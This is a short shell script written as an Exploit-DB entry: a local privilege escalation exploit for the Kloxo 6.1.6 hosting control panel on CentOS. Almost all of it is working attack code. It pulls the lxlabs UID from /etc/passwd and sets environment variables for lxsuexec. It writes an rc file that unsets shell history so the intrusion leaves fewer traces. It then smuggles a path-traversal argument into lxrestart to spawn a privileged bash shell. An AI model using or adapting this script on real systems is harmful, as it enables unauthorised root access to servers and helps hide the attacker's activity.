#!/bin/sh
# Exploit Title: Kloxo Local Privilege Escalation
# Google Dork: inurl:kiddies
# Date: August 2012 or so
# Exploit Author: HTP
# Vendor Homepage: http://lxcenter.org/
# Software Link: [download link if available]
# Version: 6.1.6 (Latest)
# Tested on: CentOS 5
# CVE : None
# This exploit requires you to be the Apache user, or another capable of running lxsuexec.
LXLABS=`cat /etc/passwd | grep lxlabs | cut -d: -f3`
export MUID=$LXLABS
export GID=$LXLABS
export TARGET=/bin/sh
export CHECK_GID=0
export NON_RESIDENT=1
echo "unset HISTFILE HISTSAVE PROMPT_COMMAND TMOUT" >> /tmp/w00trc
echo "/usr/sbin/lxrestart '../../../bin/bash --init-file /tmp/w00trc #' " > /tmp/lol
lxsuexec /tmp/lol 